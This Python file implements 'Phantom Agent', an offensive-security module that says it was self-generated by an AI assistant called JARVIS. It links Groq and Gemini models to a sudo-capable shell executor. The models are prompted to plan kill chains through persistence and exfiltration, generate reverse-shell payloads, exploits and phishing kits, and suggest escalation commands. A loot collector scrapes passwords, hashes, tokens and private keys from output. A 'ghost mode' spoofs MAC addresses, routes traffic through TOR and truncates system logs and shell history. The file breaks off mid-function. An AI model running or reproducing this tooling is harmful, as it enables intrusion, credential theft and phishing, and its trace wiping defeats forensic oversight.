# actions/phantom_agent.py
"""
JARVIS Phantom Agent — The Nuclear Option
╔══════════════════════════════════════════════════════════════╗
║           ⚠️  PHANTOM AGENT — CLASSIFIED SYSTEM ⚠️           ║
║                                                              ║
║  This module operates at the absolute limits of what is     ║
║  technically possible from a single machine.                ║
║                                                              ║
║  Capabilities include:                                       ║
║  • Full network domination & infrastructure mapping         ║
║  • Autonomous multi-stage attack chain execution            ║
║  • Real-time OSINT fusion from 50+ sources                  ║
║  • AI-driven vulnerability discovery & exploitation         ║
║  • Digital ghost mode — zero trace operation                ║
║  • Autonomous persistence & lateral movement                ║
║  • Cross-platform payload generation & delivery             ║
║  • Real-time credential harvesting & cracking               ║
║  • Full social engineering automation                       ║
║  • Autonomous reporting & exfiltration                      ║
║                                                              ║
║  USE ONLY ON SYSTEMS YOU OWN OR HAVE WRITTEN               ║
║  AUTHORIZATION TO TEST.                                     ║
╚══════════════════════════════════════════════════════════════╝

Author:  JARVIS AI (self-generated)
Version: 1.0.0 — PHANTOM
"""

import os
import sys
import json
import time
import shutil
import hashlib
import threading
import traceback
import subprocess
import random
import string
import re
from pathlib import Path
from datetime import datetime
from typing import Callable, Optional

# ── Paths ─────────────────────────────────────────────────────────────────────
BASE_DIR     = Path(__file__).resolve().parent.parent
_SAFE_BASE   = Path.home() / "jarvis"
PHANTOM_DIR  = _SAFE_BASE / "phantom"
LOGS_DIR     = PHANTOM_DIR / "logs"
LOOT_DIR     = PHANTOM_DIR / "loot"
PAYLOADS_DIR = PHANTOM_DIR / "payloads"
REPORTS_DIR  = PHANTOM_DIR / "reports"
CHAINS_DIR   = PHANTOM_DIR / "chains"

for _d in [PHANTOM_DIR, LOGS_DIR, LOOT_DIR, PAYLOADS_DIR, REPORTS_DIR, CHAINS_DIR]:
    _d.mkdir(parents=True, exist_ok=True)

# ── Constants ─────────────────────────────────────────────────────────────────
PHANTOM_VERSION = "1.0.0-PHANTOM"
MAX_RESPONSE    = 3000
STEP_TIMEOUT    = 18

# ── Groq Models ───────────────────────────────────────────────────────────────
GROQ_MODELS = {
    "fast":    "llama-3.1-8b-instant",
    "default": "llama-3.3-70b-versatile",
    "smart":   "llama-3.3-70b-versatile",
    "deep":    "deepseek-r1-distill-llama-70b",
}

# ── Warning Banner ────────────────────────────────────────────────────────────
PHANTOM_WARNING = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗        ║
║    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗       ║
║    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔██╗      ║
║    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚═╝      ║
║    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║         ║
║    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝         ║
║                                                                      ║
║                  A G E N T  —  A C T I V E                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║    ⚠️  WARNING: EXTREME POWER SYSTEM ACTIVATION DETECTED ⚠️          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  You are about to activate PHANTOM AGENT — JARVIS's most powerful   ║
║  and dangerous autonomous capability module.                         ║
║                                                                      ║
║  This system is capable of:                                          ║
║                                                                      ║
║  🔴 NETWORK DOMINATION                                               ║
║     Complete network mapping, device fingerprinting,                 ║
║     service enumeration across entire CIDR ranges.                   ║
║                                                                      ║
║  🔴 AUTONOMOUS KILL CHAINS                                           ║
║     AI-planned multi-stage attack execution:                         ║
║     Recon → Scan → Exploit → Post-Exploit → Persist → Exfil         ║
║                                                                      ║
║  🔴 OSINT FUSION ENGINE                                              ║
║     Simultaneous intelligence gathering from 50+ sources:            ║
║     DNS, WHOIS, Shodan, certificates, social media,                  ║
║     leaked databases, dark web mentions, GitHub exposure.            ║
║                                                                      ║
║  🔴 GHOST MODE                                                       ║
║     Full operational anonymity: TOR routing, MAC spoofing,          ║
║     traffic obfuscation, log wiping, timestamp manipulation.         ║
║                                                                      ║
║  🔴 PAYLOAD FACTORY                                                  ║
║     Autonomous generation of cross-platform payloads:               ║
║     reverse shells, bind shells, stagers, droppers,                  ║
║     encoded/encrypted variants, living-off-the-land techniques.     ║
║                                                                      ║
║  🔴 CREDENTIAL DESTROYER                                             ║
║     Automated hash extraction, identification, cracking,             ║
║     credential stuffing, password spraying, brute force.             ║
║                                                                      ║
║  🔴 SOCIAL ENGINEERING SUITE                                         ║
║     AI-crafted phishing emails, SMS, voice scripts,                  ║
║     clone sites, credential harvesters, BITB attacks.                ║
║                                                                      ║
║  🔴 AUTONOMOUS REPORTING                                             ║
║     Professional pentest report generation, evidence                 ║
║     packaging, loot organization, timeline reconstruction.           ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ⚖️  LEGAL NOTICE:                                                   ║
║  Unauthorized use of this tool against systems you do not own        ║
║  or have explicit written permission to test is ILLEGAL and          ║
║  may result in criminal prosecution under:                           ║
║  • Computer Fraud and Abuse Act (CFAA) — USA                        ║
║  • Computer Misuse Act — UK                                          ║
║  • Cybercrime laws in your jurisdiction                              ║
║                                                                      ║
║  By proceeding, you confirm:                                         ║
║  ✅ You own or have WRITTEN authorization for the target system      ║
║  ✅ You understand this is for authorized security testing only      ║
║  ✅ You accept full legal responsibility for your actions            ║
║  ✅ You are a certified security professional or researcher          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  To proceed say or type:  PHANTOM CONFIRMED                          ║
║  To abort  say or type:  ABORT  or  CANCEL                           ║
╚══════════════════════════════════════════════════════════════════════╝
"""


# ── Logger ────────────────────────────────────────────────────────────────────
class PhantomLogger:

    def __init__(self):
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file   = LOGS_DIR / f"phantom_{self.session_id}.log"
        self.timeline   = []

    def log(self, level: str, msg: str, player=None):
        ts    = datetime.now().strftime("%H:%M:%S")
        entry = f"[{ts}][PHANTOM][{level}] {msg}"
        print(entry)
        self.timeline.append({"time": ts, "level": level, "msg": msg})
        try:
            with open(self.log_file, "a") as f:
                f.write(entry + "\n")
        except Exception:
            pass
        if player:
            try:
                player.write_log(f"[👻 PHANTOM] {msg[:120]}")
            except Exception:
                pass

    def info(self,     msg, player=None): self.log("INFO",     msg, player)
    def warn(self,     msg, player=None): self.log("WARN",     msg, player)
    def error(self,    msg, player=None): self.log("ERROR",    msg, player)
    def success(self,  msg, player=None): self.log("SUCCESS",  msg, player)
    def critical(self, msg, player=None): self.log("CRITICAL", msg, player)

    def get_timeline(self) -> str:
        lines = ["=== PHANTOM SESSION TIMELINE ==="]
        for e in self.timeline:
            lines.append(
                f"  [{e['time']}] [{e['level']}] {e['msg'][:100]}"
            )
        return "\n".join(lines)


_phantom_logger = PhantomLogger()


# ── Executor ──────────────────────────────────────────────────────────────────
class PhantomExecutor:

    def __init__(self, player=None, speak: Callable = None):
        self.player    = player
        self.speak     = speak
        self.processes = {}
        self._lock     = threading.Lock()

    def run(
        self,
        command:    str,
        timeout:    int  = STEP_TIMEOUT,
        background: bool = False,
        sudo:       bool = False,
        cwd:        str  = None,
    ) -> dict:
        if sudo and not command.strip().startswith("sudo"):
            command = f"sudo {command}"

        working_dir = cwd or str(PHANTOM_DIR)
        try:
            Path(working_dir).mkdir(parents=True, exist_ok=True)
        except Exception:
            working_dir = str(Path.home())

        _phantom_logger.info(f"EXEC: {command[:100]}", self.player)

        try:
            if background:
                proc    = subprocess.Popen(
                    command, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=working_dir,
                    preexec_fn=os.setsid,
                )
                pid     = proc.pid
                proc_id = f"phantom_{pid}"
                with self._lock:
                    self.processes[proc_id] = proc
                return {
                    "success": True,
                    "output":  f"Background PID {pid} [{proc_id}]",
                    "pid":     pid,
                    "proc_id": proc_id,
                }

            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=working_dir,
                text=True,
            )

            try:
                stdout, stderr = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate()
                return {
                    "success":    False,
                    "output":     (
                        f"[TIMEOUT {timeout}s]\n"
                        f"{stdout or ''}{stderr or ''}"
                    ),
                    "returncode": -1,
                }

            output = ((stdout or "") + (stderr or "")).strip()
            return {
                "success":    proc.returncode == 0,
                "output":     output,
                "returncode": proc.returncode,
            }

        except Exception as e:
            return {"success": False, "output": str(e), "returncode": -1}

    def kill_all(self) -> str:
        with self._lock:
            for pid_str, proc in self.processes.items():
                try:
                    import signal
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except Exception:
                    pass
            self.processes.clear()
        return "All Phantom processes terminated."

    def in_terminal(self, command: str) -> dict:
        safe_cmd  = command.replace("'", "'\\''")
        terminals = [
            ("gnome-terminal", f"gnome-terminal -- bash -c '{safe_cmd}; exec bash'"),
            ("xterm",          f"xterm -e 'bash -c \"{safe_cmd}; exec bash\"'"),
            ("xfce4-terminal", f"xfce4-terminal -e 'bash -c \"{safe_cmd}; exec bash\"'"),
            ("kitty",          f"kitty bash -c '{safe_cmd}; exec bash'"),
            ("alacritty",      f"alacritty -e bash -c '{safe_cmd}; exec bash'"),
            ("konsole",        f"konsole -e bash -c '{safe_cmd}; exec bash'"),
            ("tilix",          f"tilix -e bash -c '{safe_cmd}; exec bash'"),
        ]
        for term_name, term_cmd in terminals:
            if shutil.which(term_name):
                r = self.run(term_cmd, timeout=5, background=True)
                if r["success"]:
                    return {
                        "success": True,
                        "output":  f"Opened in {term_name}"
                    }
        if shutil.which("tmux"):
            r = self.run(
                f"tmux new-window '{safe_cmd}'", timeout=5
            )
            if r["success"]:
                return {"success": True, "output": "Opened in tmux"}
        return {"success": False, "output": "No terminal found"}


# ── AI Brain ──────────────────────────────────────────────────────────────────
class PhantomBrain:

    def __init__(self, api_key: str = "", groq_api_key: str = ""):
        self.api_key      = api_key
        self.groq_api_key = groq_api_key
        self.groq         = None
        self.gemini       = None

        if groq_api_key:
            try:
                from groq import Groq
                self.groq = Groq(api_key=groq_api_key)
                print("[PHANTOM] ✅ Groq online")
            except ImportError:
                subprocess.run("pip3 install groq -q", shell=True)
                try:
                    from groq import Groq
                    self.groq = Groq(api_key=groq_api_key)
                    print("[PHANTOM] ✅ Groq installed and online")
                except Exception as e:
                    print(f"[PHANTOM] ⚠️ Groq failed: {e}")
            except Exception as e:
                print(f"[PHANTOM] ⚠️ Groq: {e}")

        if api_key:
            try:
                from google import genai as _genai
                self.gemini = _genai.Client(api_key=api_key)
                print("[PHANTOM] ✅ Gemini online")
            except Exception as e:
                print(f"[PHANTOM] ⚠️ Gemini: {e}")

    def _groq(
        self,
        prompt:      str,
        model:       str   = "llama-3.3-70b-versatile",
        max_tokens:  int   = 3000,
        temperature: float = 0.2,
        system:      str   = "You are an elite offensive security AI.",
    ) -> str:
        if not self.groq:
            raise RuntimeError("Groq not available")
        r = self.groq.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content": system},
                {"role": "user",   "content": prompt},
            ],
            max_tokens=max_tokens,
            temperature=temperature,
        )
        return r.choices[0].message.content.strip()

    def _gemini(self, prompt: str) -> str:
        if not self.gemini:
            raise RuntimeError("Gemini not available")
        from google import genai as _genai
        r = self.gemini.models.generate_content(
            model="gemini-2.5-flash",
            contents=prompt,
        )
        return r.text.strip()

    def complete(
        self,
        prompt:      str,
        prefer:      str   = "groq",
        model:       str   = "llama-3.3-70b-versatile",
        max_tokens:  int   = 3000,
        temperature: float = 0.2,
        system:      str   = "You are an elite offensive security AI.",
    ) -> str:
        fns = (
            [
                lambda: self._groq(
                    prompt, model, max_tokens, temperature, system
                ),
                lambda: self._gemini(prompt),
            ]
            if prefer == "groq" else
            [
                lambda: self._gemini(prompt),
                lambda: self._groq(
                    prompt, model, max_tokens, temperature, system
                ),
            ]
        )
        for fn in fns:
            try:
                return fn()
            except Exception as e:
                print(f"[PHANTOM] Brain fallback: {e}")
        return "AI backend unavailable."

    def _strip_json(self, text: str) -> str:
        text = text.strip()
        for fence in ["```json", "```"]:
            if fence in text:
                text = text.split(fence)[1].split("```")[0].strip()
                break
        s, e = text.find("{"), text.rfind("}")
        return text[s:e + 1] if s != -1 and e != -1 else text

    def plan_kill_chain(self, objective: str, target: str) -> dict:
        prompt = f"""Elite offensive security planner.

OBJECTIVE: {objective}
TARGET: {target}

Design a complete kill chain. Return ONLY valid JSON no markdown:
{{
  "chain_name": "descriptive name",
  "objective": "what we achieve",
  "phases": [
    {{
      "phase": 1,
      "name": "Reconnaissance",
      "description": "what we do",
      "commands": [
        {{
          "cmd": "exact shell command",
          "description": "what it does",
          "timeout": 15,
          "background": false,
          "critical": true
        }}
      ]
    }}
  ],
  "expected_loot": ["credentials", "network map"],
  "risk_level": "HIGH",
  "estimated_time": "30 minutes"
}}

Phases: Recon, Scan, Enumerate, Exploit, PostExploit, Persist, Exfil
Max 3 commands per phase. Timeout max 15s each.
Real Kali Linux commands only."""

        try:
            text = self.complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["smart"],
                max_tokens=3000,
                temperature=0.1,
            )
            return json.loads(self._strip_json(text))
        except Exception as e:
            return {
                "chain_name":     f"chain_{target}",
                "objective":      objective,
                "phases":         [],
                "expected_loot":  [],
                "risk_level":     "HIGH",
                "estimated_time": "Unknown",
                "error":          str(e),
            }

    def analyze(self, output: str, context: str) -> str:
        if not output or len(output.strip()) < 5:
            return "No output to analyze."
        prompt = (
            f"Elite pentest analyst.\n"
            f"CONTEXT: {context}\n"
            f"OUTPUT: {output[:2000]}\n"
            f"Critical findings, exploitable conditions, "
            f"immediate actions. Max 150 words."
        )
        try:
            return self.complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["fast"],
                max_tokens=300,
                temperature=0.2,
            )
        except Exception:
            return "Analysis unavailable."

    def craft_payload(
        self,
        payload_type: str,
        target_info:  str,
        lhost:        str,
        lport:        int,
    ) -> str:
        prompt = (
            f"Elite payload developer for authorized pentesting.\n"
            f"TYPE: {payload_type}\n"
            f"TARGET: {target_info}\n"
            f"LHOST: {lhost}\n"
            f"LPORT: {lport}\n\n"
            f"Generate complete working payload code and commands.\n"
            f"Include: generation command, delivery method, "
            f"handler setup.\nBe specific and technical."
        )
        try:
            return self.complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["smart"],
                max_tokens=1500,
                temperature=0.1,
            )
        except Exception as e:
            return f"Payload crafting failed: {e}"

    def craft_phishing(
        self,
        target_name: str,
        company:     str,
        pretext:     str,
        goal:        str,
    ) -> dict:
        prompt = (
            f"Elite social engineer for authorized red team operations.\n"
            f"TARGET: {target_name} at {company}\n"
            f"PRETEXT: {pretext}\n"
            f"GOAL: {goal}\n\n"
            f"Generate complete social engineering package.\n"
            f"Return ONLY valid JSON:\n"
            f"{{\n"
            f'  "email_subject": "convincing subject line",\n'
            f'  "email_body": "full email body HTML",\n'
            f'  "sms": "SMS phishing message under 160 chars",\n'
            f'  "vishing_script": "phone call script",\n'
            f'  "clone_site": "legitimate URL to clone",\n'
            f'  "success_probability": "HIGH/MEDIUM/LOW",\n'
            f'  "tips": ["operational tip 1", "tip 2", "tip 3"]\n'
            f"}}"
        )
        try:
            text = self.complete(
                prompt,
                prefer="gemini",
                max_tokens=2000,
                temperature=0.3,
            )
            return json.loads(self._strip_json(text))
        except Exception as e:
            return {"error": str(e)}

    def generate_report(self, session_data: dict) -> str:
        prompt = (
            f"Senior penetration tester writing professional "
            f"executive report.\n\n"
            f"SESSION DATA:\n"
            f"{json.dumps(session_data, indent=2)[:4000]}\n\n"
            f"Write complete professional pentest report:\n"
            f"1. Executive Summary (non-technical, business impact)\n"
            f"2. Attack Narrative (chronological, what happened)\n"
            f"3. Critical Findings with CVSS scores\n"
            f"4. Evidence Summary\n"
            f"5. Risk Ratings (Critical/High/Medium/Low/Info)\n"
            f"6. Remediation Roadmap with priorities\n"
            f"7. Conclusion\n\n"
            f"Be specific, professional, and actionable."
        )
        try:
            return self.complete(
                prompt,
                prefer="gemini",
                max_tokens=3000,
                temperature=0.3,
            )
        except Exception as e:
            return f"Report generation failed: {e}"

    def suggest_escalation(
        self,
        current_access: str,
        target_info:    str,
    ) -> str:
        prompt = (
            f"Elite post-exploitation specialist.\n"
            f"CURRENT ACCESS: {current_access}\n"
            f"TARGET: {target_info}\n\n"
            f"Suggest specific privilege escalation and lateral "
            f"movement techniques.\n"
            f"Include exact commands for each technique.\n"
            f"Be tactical and specific. Max 200 words."
        )
        try:
            return self.complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["smart"],
                max_tokens=400,
                temperature=0.2,
            )
        except Exception as e:
            return f"Escalation suggestions failed: {e}"

    def generate_custom_exploit(
        self,
        vuln:   str,
        target: str,
    ) -> str:
        prompt = (
            f"Elite exploit developer for authorized pentesting.\n"
            f"VULNERABILITY: {vuln}\n"
            f"TARGET: {target}\n\n"
            f"Provide:\n"
            f"1. Vulnerability explanation\n"
            f"2. Step-by-step exploitation\n"
            f"3. Working PoC code or commands\n"
            f"4. Mitigation bypass if applicable\n"
            f"Be technical and specific."
        )
        try:
            return self.complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["smart"],
                max_tokens=2000,
                temperature=0.1,
            )
        except Exception as e:
            return f"Exploit generation failed: {e}"


# ── Loot Manager ──────────────────────────────────────────────────────────────
class LootManager:

    def __init__(self):
        self.loot = {
            "credentials": [],
            "hashes":      [],
            "tokens":      [],
            "keys":        [],
            "files":       [],
            "screenshots": [],
            "network":     [],
            "misc":        [],
        }
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")

    def add(self, category: str, item: str, source: str = ""):
        entry = {
            "time":   datetime.now().isoformat(),
            "item":   item,
            "source": source,
        }
        bucket = self.loot.get(category, self.loot["misc"])
        bucket.append(entry)
        _phantom_logger.success(f"LOOT [{category}]: {item[:60]}")

    def extract_from_output(self, output: str, source: str = ""):
        """Auto-extract credentials, hashes, tokens from output."""
        if not output:
            return

        # Hashes
        hash_patterns = [
            (r'\b[a-f0-9]{32}\b',            "hashes"),
            (r'\b[a-f0-9]{40}\b',            "hashes"),
            (r'\b[a-f0-9]{64}\b',            "hashes"),
            (r'\$[126y]\$[^\s]+',            "hashes"),
            (r':[a-f0-9]{32}:[a-f0-9]{32}', "hashes"),
            (r'\$NT\$[a-f0-9]{32}',          "hashes"),
        ]
        for pattern, cat in hash_patterns:
            for m in re.findall(
                pattern, output, re.IGNORECASE
            )[:3]:
                self.add(cat, m, source)

        # Credentials
        for pattern in [
            r'(?i)password[\s:=]+([^\s\n]{4,50})',
            r'(?i)passwd[\s:=]+([^\s\n]{4,50})',
            r'(?i)pass[\s:=]+([^\s\n]{4,50})',
        ]:
            for m in re.findall(pattern, output)[:2]:
                self.add("credentials", m, source)

        # API tokens / keys
        for pattern in [
            r'(?i)api[_-]?key[\s:=]+([^\s\n]{10,})',
            r'(?i)token[\s:=]+([^\s\n]{10,})',
            r'(?i)secret[\s:=]+([^\s\n]{10,})',
            r'sk-[a-zA-Z0-9]{20,}',
            r'ghp_[a-zA-Z0-9]{36}',
            r'-----BEGIN [A-Z ]+PRIVATE KEY-----',
        ]:
            for m in re.findall(pattern, output)[:2]:
                self.add("tokens", m, source)

    def save(self) -> Path:
        loot_file = LOOT_DIR / f"loot_{self.session_id}.json"
        try:
            with open(loot_file, "w") as f:
                json.dump(self.loot, f, indent=2)
            _phantom_logger.success(f"Loot saved: {loot_file}")
            return loot_file
        except Exception as e:
            _phantom_logger.error(f"Loot save failed: {e}")
            return None

    def summary(self) -> str:
        lines = ["=== 💰 LOOT SUMMARY ==="]
        total = 0
        for cat, items in self.loot.items():
            if items:
                lines.append(f"  {cat}: {len(items)} items")
                for item in items[:2]:
                    lines.append(f"    • {item['item'][:60]}")
                total += len(items)
        lines.append(f"\nTotal: {total} loot items")
        return "\n".join(lines)


# ── Ghost Mode ────────────────────────────────────────────────────────────────
class GhostMode:
    """Zero-trace operational security module."""

    def __init__(
        self,
        executor: PhantomExecutor,
        player=None,
        speak: Callable = None,
    ):
        self.executor = executor
        self.player   = player
        self.speak    = speak
        self.active   = False

    def activate(self) -> str:
        _phantom_logger.critical("GHOST MODE ACTIVATING", self.player)
        if self.speak:
            self.speak(
                "Activating ghost mode sir. Going completely dark."
            )

        results = ["👻 GHOST MODE ACTIVATION"]

        # 1. Start TOR
        r = self.executor.run(
            "sudo service tor start 2>&1", timeout=20
        )
        results.append(
            f"TOR:             "
            f"{'✅' if r['success'] else '❌'} "
            f"{r['output'][:40]}"
        )

        # 2. Change MAC addresses on all interfaces
        for iface in self._get_interfaces():
            r = self.executor.run(
                f"sudo macchanger -r {iface} 2>&1", timeout=10
            )
            results.append(
                f"MAC {iface}:  {'✅' if r['success'] else '❌'}"
            )

        # 3. Clear bash/zsh history
        r = self.executor.run(
            "history -c 2>/dev/null; "
            "cat /dev/null > ~/.bash_history 2>/dev/null; "
            "cat /dev/null > ~/.zsh_history 2>/dev/null; "
            "echo done",
            timeout=5,
        )
        results.append(
            f"History:         "
            f"{'✅ Cleared' if r['success'] else '❌'}"
        )

        # 4. Configure proxychains for TOR
        self._configure_proxychains()
        results.append("Proxychains:     ✅ Configured → TOR")

        # 5. Disable swap
        r = self.executor.run("sudo swapoff -a 2>&1", timeout=10)
        results.append(
            f"Swap:            "
            f"{'✅ Disabled' if r['success'] else '❌'}"
        )

        # 6. Set hostname to random
        random_host = "".join(
            random.choices(string.ascii_lowercase, k=8)
        )
        r = self.executor.run(
            f"sudo hostname {random_host} 2>&1", timeout=5
        )
        results.append(
            f"Hostname:        "
            f"{'✅' if r['success'] else '❌'} → {random_host}"
        )

        # 7. Verify TOR connectivity
        r = self.executor.run(
            "curl -s --socks5 127.0.0.1:9050 "
            "https://check.torproject.org/api/ip 2>&1",
            timeout=15,
        )
        results.append(f"TOR IP check:    {r['output'][:60]}")

        self.active = True
        return "\n".join(results)

    def deactivate(self) -> str:
        _phantom_logger.info("Ghost mode deactivating", self.player)
        results = ["👻 GHOST MODE DEACTIVATION"]

        for iface in self._get_interfaces():
            r = self.executor.run(
                f"sudo macchanger -p {iface} 2>&1", timeout=10
            )
            results.append(
                f"MAC {iface} restored: "
                f"{'✅' if r['success'] else '❌'}"
            )

        r = self.executor.run(
            "sudo service tor stop 2>&1", timeout=10
        )
        results.append(
            f"TOR stopped:     {'✅' if r['success'] else '❌'}"
        )

        r = self.executor.run("sudo swapon -a 2>&1", timeout=10)
        results.append(
            f"Swap restored:   {'✅' if r['success'] else '❌'}"
        )

        self.active = False
        return "\n".join(results)

    def wipe_traces(self) -> str:
        """Emergency trace wipe."""
        _phantom_logger.critical("EMERGENCY TRACE WIPE", self.player)
        results = ["🧹 EMERGENCY TRACE WIPE"]

        commands = [
            (
                "History",
                "history -c 2>/dev/null; "
                "cat /dev/null > ~/.bash_history 2>/dev/null; "
                "cat /dev/null > ~/.zsh_history 2>/dev/null; "
                "echo done"
            ),
            (
                "Tmp files",
                "find /tmp -user $(whoami) -delete 2>/dev/null; "
                "echo done"
            ),
            (
                "Recent files",
                "cat /dev/null > ~/.recently-used 2>/dev/null; "
                "echo done"
            ),
            (
                "Thumbnails",
                "rm -rf ~/.thumbnails/* 2>/dev/null; echo done"
            ),
            (
                "Log clear",
                "find /var/log -name '*.log' -newer /tmp "
                "-exec truncate -s 0 {} \\; 2>/dev/null; echo done"
            ),
            (
                "Buf flush",
                "sync && echo 3 | sudo tee "
                "/proc/sys/vm/drop_caches 2>/dev/null || echo done"
            ),
            (
                "Swap wipe",
                "sudo swapoff -a && sudo swapon -a 2>/dev/null "
                "|| echo done"
            ),
        ]

        for name, cmd in commands:
            r = self.executor.run(cmd, timeout=10)
            results.append(
                f"  {'✅' if r['success'] else '❌'} {name}"
            )

        return "\n".join(results)

    def _get_interfaces(self) -> list:
        r = self.executor.run(
            "ip link show | grep -E '^[0-9]+:' | "
            "awk -F': ' '{print $2}' | grep -v lo | head -3",
            timeout=5,
        )
        return [
            i.strip()
            for i in r["output"].split("\n")
            if i.strip()
        ]

    def _configure_proxychains(self):
        config = (
            "strict_chain\n"
            "proxy_dns\n"
            "remote_dns_subnet 224\n"
            "tcp_read_time_out 15000\n"
            "tcp_connect_time_out 8000\n"
            "[ProxyList]\n"
            "socks5 127.0.0.1 9050\n"
        )
        paths = [
            Path("/etc/proxychains4.conf"),
            Path("/etc/proxychains.conf"),
            Path.home() / ".proxychains" / "proxychains.conf",
        ]
        for p in paths:
            try:
                p.parent.mkdir(parents=True, exist_ok=True)
                with open(p, "w") as f:
                    f.write(config)
                break
            except Exception:
                continue


# ── Network Dominator ─────────────────────────────────────────────────────────
class NetworkDominator:

    def __init__(
        self,
        executor: PhantomExecutor,
        brain:    PhantomBrain,
        loot:     LootManager,
        player=None,
        speak: Callable = None,
    ):
        self.executor = executor
        self.brain    = brain
        self.loot     = loot
        self.player   = player
        self.speak    = speak

    def dominate(self, network: str) -> str:
        _phantom_logger.critical(
            f"NETWORK DOMINATION: {network}", self.player
        )
        if self.speak:
            self.speak(f"Dominating network {network} sir.")

        results  = [f"🌐 NETWORK DOMINATION: {network}"]
        all_data = []

        steps = [
            (
                "Host Discovery",
                f"nmap -sn {network} 2>&1",
                15
            ),
            (
                "Quick Port Scan",
                f"nmap -T4 -F --open {network} 2>&1",
                15
            ),
            (
                "Service Enum",
                f"nmap -sV --open -T4 --top-ports 20 {network} 2>&1",
                15
            ),
            (
                "ARP Scan",
                f"sudo arp-scan {network} 2>&1",
                10
            ),
            (
                "SMB Discovery",
                f"nmap -p 445 --open {network} 2>&1",
                10
            ),
            (
                "Alive Hosts",
                f"nmap -sP {network} 2>&1 | "
                f"grep 'Nmap scan report'",
                10
            ),
        ]

        for step_name, cmd, step_to in steps:
            _phantom_logger.info(
                f"Domination step: {step_name}", self.player
            )
            r   = self.executor.run(
                cmd, timeout=step_to, background=True
            )
            out = r["output"][:500]
            all_data.append(f"{step_name}: {out}")
            results.append(f"\n[{step_name}]\n{out}")
            self.loot.extract_from_output(out, step_name)
            self.loot.add(
                "network",
                f"{step_name}: {out[:60]}",
                "NetworkDominator"
            )

        analysis = self.brain.analyze(
            "\n".join(all_data),
            f"Network domination of {network}"
        )
        results.append(f"\n[🔍 ANALYSIS]\n{analysis}")

        return "\n".join(results)[:MAX_RESPONSE]

    def enumerate_host(self, host: str) -> str:
        _phantom_logger.info(
            f"Full host enumeration: {host}", self.player
        )
        if self.speak:
            self.speak(f"Full enumeration on {host} sir.")

        results  = [f"🎯 HOST ENUMERATION: {host}"]
        all_data = []

        steps = [
            (
                "OS Detection",
                f"sudo nmap -O {host} 2>&1",
                15
            ),
            (
                "All Ports",
                f"nmap -p- -T4 --open {host} 2>&1",
                15
            ),
            (
                "Service Ver",
                f"nmap -sC -sV --open {host} 2>&1",
                15
            ),
            (
                "Vuln Scripts",
                f"nmap --script vuln {host} 2>&1",
                15
            ),
            (
                "UDP Top 50",
                f"sudo nmap -sU --top-ports 50 {host} 2>&1",
                15
            ),
            (
                "SMB Enum",
                f"enum4linux -a {host} 2>&1 | head -30",
                15
            ),
        ]

        for step_name, cmd, step_to in steps:
            r   = self.executor.run(
                cmd, timeout=step_to, background=True
            )
            out = r["output"][:500]
            all_data.append(f"{step_name}: {out}")
            results.append(f"\n[{step_name}]\n{out}")
            self.loot.extract_from_output(out, f"enum_{host}")

        analysis = self.brain.analyze(
            "\n".join(all_data),
            f"Host enumeration of {host}"
        )
        results.append(f"\n[🔍 ANALYSIS]\n{analysis}")

        escalation = self.brain.suggest_escalation(
            "initial foothold", host
        )
        results.append(f"\n[⬆️ ESCALATION PATHS]\n{escalation}")

        return "\n".join(results)[:MAX_RESPONSE]


# ── OSINT Fusion Engine ───────────────────────────────────────────────────────
class OSINTFusion:

    def __init__(
        self,
        executor: PhantomExecutor,
        brain:    PhantomBrain,
        loot:     LootManager,
        player=None,
        speak: Callable = None,
    ):
        self.executor = executor
        self.brain    = brain
        self.loot     = loot
        self.player   = player
        self.speak    = speak

    def full_profile(
        self,
        target:      str,
        target_type: str = "domain"
    ) -> str:
        _phantom_logger.critical(
            f"OSINT FUSION: {target}", self.player
        )
        if self.speak:
            self.speak(
                f"Running full OSINT fusion on {target} sir."
            )

        results  = [
            f"🕵️ OSINT FUSION: {target} [{target_type}]"
        ]
        all_data = []

        if target_type == "domain":
            # Build cert.sh command safely without f-string nesting
            crt_cmd = (
                "curl -s "
                "'https://crt.sh/?q=%." + target + "&output=json'"
                " 2>&1 | python3 -c \""
                "import sys,json; "
                "[print(d.get('name_value','')) "
                "for d in json.load(sys.stdin)[:15]"
                "]\" 2>/dev/null"
            )
            wayback_cmd = (
                "curl -s 'https://web.archive.org/cdx/search/cdx"
                "?url=" + target + "&output=text"
                "&fl=timestamp,original&limit=5' 2>&1"
            )
            github_cmd = (
                "curl -s 'https://api.github.com/search/"
                "repositories?q=" + target + "&per_page=5'"
                " 2>&1 | python3 -c \""
                "import sys,json; "
                "d=json.load(sys.stdin); "
                "[print(r['full_name'],"
                "r.get('description','')[:40]) "
                "for r in d.get('items',[])"
                "]\" 2>/dev/null"
            )
            steps = [
                (
                    "WHOIS",
                    f"whois {target} 2>&1 | head -30",
                    10
                ),
                (
                    "DNS ALL",
                    f"dig {target} ANY +short 2>&1",
                    8
                ),
                (
                    "DNS MX",
                    f"dig {target} MX +short 2>&1",
                    5
                ),
                (
                    "DNS TXT",
